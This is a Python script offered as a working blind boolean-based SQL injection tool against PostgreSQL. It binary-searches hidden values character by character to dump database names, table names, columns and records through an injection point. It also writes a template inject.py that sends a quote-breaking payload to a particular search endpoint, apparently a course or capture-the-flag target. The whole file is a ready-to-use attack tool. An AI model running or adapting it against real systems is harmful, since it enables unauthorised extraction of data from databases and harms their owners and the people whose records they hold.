#!/usr/bin/env python3

'''
Tool to use blindly boolean based SQL injection
to deduce the value of a string or number

Currently only support PostgreSQL
TODO: support for other DBMS
TODO: threading for efficiency

Author: Chester Pang <i@bopa.ng>
'''

import re
import sys
import os
import string
from time import sleep
from argparse import ArgumentParser
from tqdm import tqdm
import requests


# parsed command line args
args = None


def print_info(*arg, **kwargs):
    if(not args.silent):
        print('[INFO] ' + ' '.join(map(str, arg)), **kwargs)


def print_debug(*arg, **kwargs):
    if(args.verbose and not args.silent):
        print('[DEBUG] ' + ' '.join(map(str, arg)), **kwargs)


# default char range for determine string subquery
char_range = list(map(ord, sorted(string.ascii_letters +
                                  string.digits + '-_ {}')))
# count of total_injections
total_injection = 0

'''
user defined injection function
to put given boolean payload into sql query
and return result of this boolean
'''
true_re = re.compile(r'woah cute right')
retry_gap = 100
session = requests.Session()


# user suppied boolean based sqli inject function
inject = None


'''
user bin search to figure out value
for a subquery that gives an integer
key-word args can have:
    left - initial lower bound
    right - initial upper bound
'''
def determine_number(subquery, **kwargs):
    print_debug("Determining integer value for query:", subquery)
    left = kwargs['left'] if 'left' in kwargs else None
    if not left:
        # manually determine l from -1
        left = -1
        while inject("({}) < {}".format(subquery, left)):
            left *= 10

    # print_debug("Determined lower bound for", subquery, left)

    right = kwargs['right'] if 'right' in kwargs else None
    if not right:
        # manually determine r from 1
        right = 1
        while inject("({}) > {}".format(subquery, right)):
            right *= 10

    # print_debug("Determined upper bound for", subquery, right)

    # sanity check
    if not inject("({}) > 0 or ({}) <= 0".format(subquery, subquery)):
        return 0

    # do binary search to find value for subquery
    while left < right:
        mid = int((left + right) / 2)
        if inject("({}) > {}".format(subquery, mid)):
            left = mid + 1
            print_debug("Found new lower bound:", left)
        else:
            right = mid
            print_debug("Found new upper bound:", right)

    if inject("({})<>{}".format(subquery, left)):
        raise Exception('Cannot determine value for query {}, '
                        'result is between {} and {}'
                        .format(subquery, left, right))

    print_debug("Found value for {}: {}".format(subquery, left))
    return left



'''
determine list of records with single column
'''
def determine_records(subquery, **kwargs):
    print_info("Determining all recoreds for query:", subquery)

    if 'count' in kwargs:
        n_records = kwargs['count']
    else:
        if 'count_query' in kwargs:
            count_query = kwargs['count_query']
        else:
            query_pattern = r'(select) [\w,\ .]+ (from [\s\S]*)'
            # construct a count query to determine number of records
            if re.search(query_pattern, subquery, flags=re.IGNORECASE):
                count_query = re.sub(query_pattern, r'\1 count(*) \2',
                                     subquery, flags=re.IGNORECASE)
            else:
                print('Cannot reliably determine query for counting '
                      'number of records')
                count_query = input('please provide one (q for quit): ')
                if count_query == 'q':
                    exit()
        print_debug("Count query:", count_query)
        n_records = determine_number(count_query, left=0)

    print_info('Found {} records, fuzzing them now...'.format(n_records))

    res = []
    pbar = range(n_records)
    if not args.silent:
        pbar = tqdm(pbar)
    for i in pbar:
        res.append(determine_string("{} LIMIT 1 OFFSET {}"
                                    .format(subquery, i),
                                    not args.no_individual_pbar))
        if not args.silent:
            pbar.write("Determined record: " + res[-1])
    return res


'''
Determine a subquery that return a single record with a single column
'''
def determine_string(subquery, pbar_enabled=True):
    # determine length of the string first
    length = determine_number("length(({}))".format(subquery), left=0)

    if length == 0:
        return ""

    print_debug("Determining string value for query:", subquery)

    res = [-1]
    res *= length
    pbar = range(length)
    if pbar_enabled and not args.silent:
        pbar = tqdm(pbar)
    for i in pbar:
        # binary search for matching char in char_range
        left = 0
        right = len(char_range) - 1
        while left < right:
            mid = int((left + right) / 2)
            if inject("ascii(substr(({}),{},1))>{}"
                      .format(subquery, i+1, char_range[mid])):
                left = mid + 1
            else:
                right = mid

        if left >= len(char_range) or \
                not inject("ascii(substr(({}),{},1))={}"
                           .format(subquery, i+1, char_range[left])):
            raise Exception("Cannot determine offset {} char for query {}\n"
                            "{}/{} Current result: {}"
                            .format(i, subquery, i, length,
                                    ''.join(['*' if c == -1 else chr(c)
                                             for c in res])))

        res[i] = char_range[left]

        if pbar_enabled and not args.silent:
            pbar.set_description(''.join(
                ['*' if c == -1 else chr(c)
                 for c in res])
                [i-50 if i >= 50 else 0 : 50 if i < 50 else i+1])

        i += 1
    res = ''.join(map(chr, res))
    print_debug("Determined result for query '{}': {}".format(subquery, res))
    return res


'''
verify if the provided boolean sqli is working
'''
def verify_inject():
    return inject("'1'='1'") and not inject("'1'='2'")

def main():
    global inject

    # create template file if not present in curr dir
    if not os.path.isfile('./inject.py'):
        with open('./inject.py', 'w+') as f:
            f.write("""
# NOTE: this is a auto generated template file
#       Please modify inject_func in this file
#       to do your own sqli
import re
from time import sleep
import requests

true_re = re.compile(r'woah cute right')
retry_gap = 100
session = requests.Session()


'''
user defined injection function
this function should put given boolean payload
into sql query and execute it
return result of this boolean

    payload - boolean expression to put into sqli payload
    args - parsed command line arguments, see boolean_fuzz.py

return bool result of the query
'''

def inject_func(payload, args):
    post_data = {'search': "' and {} and '1' LIKE '1".format(payload)}

    # print_debug("inject boolean payload", payload)

    for i in range(args.retries):
        r = session.post('http://week3.ns.agency/search', data=post_data)
        if r.ok:
            return true_re.search(r.text)
        else:
            sleep(retry_gap / 1000)
    raise Exception("Cannot get valid response for request: {}"
                    .format(post_data))
            """)
            print('You have to provide a function to define your sqli')
            print('A template file has been written to inject.py in current dir')
            print('Modify it and rerun this script')
            exit(0)

    global args
    global char_range

    parser = ArgumentParser(description='Use a given boolean injection point '
                                        'to fuzz results of a subquery')
    parser.add_argument('-t', '--type', dest='type', required=True,
                        help='Type of query: string | integer | records | '
                             'databases | tables | columns | table')
    parser.add_argument('--retries', required=False, type=int, default=5,
                        help='Max of retries for single injection')
    parser.add_argument('-s', '--silent', action='store_true',
                        dest='silent', help='Silent mode, only print result')
    parser.add_argument('-a', '--use-all-printable-char', action='store_true',
                        dest='use_all_printables',
                        help='Use all printable chars to fuzz string')
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        help='Verbose mode, print debug info')
    parser.add_argument('-P', '--diable-individual-record-progress', 
                        action='store_true', dest='no_individual_pbar',
                        help='Disable individual progress bar for each record')
    parser.add_argument('-V', '--do-not-verify-sqli', action='store_true',
                        dest='no_verify',
                        help='Skip verification of given sqli')
    parser.add_argument('-q', '--query', default=None, help='query to fuzz')

    args = parser.parse_args()

    # try to acquire user provided inject function
    sys.path.append(os.path.abspath('.'))
    from inject import inject_func

    def inject_and_increment(payload):
        global total_injection
        total_injection += 1
        return inject_func(payload, args)

    inject = inject_and_increment


    if args.use_all_printables:
        char_range = sorted(list(map(ord, string.printable)))

    if not args.no_verify:
        if not verify_inject():
            print('sqli verification failed, check your inject.py')
            exit()
        else:
            print_debug('sqli injection seems to be working')


    if args.type == 'string':
        print(determine_string(args.query))
    elif args.type == 'integer':
        print(determine_number(args.query))
    elif args.type == 'records':
        print(determine_records(args.query))
    elif args.type == 'databases':
        print(determine_records('SELECT datname FROM pg_database'))
    elif args.type == 'tables':
        print(determine_records("SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)"))
    elif args.type == 'columns':
        print(determine_records("SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND relname='" + args.query + "'"))

    print_info(total_injection, "injections performed")

if __name__ == '__main__':
    main()
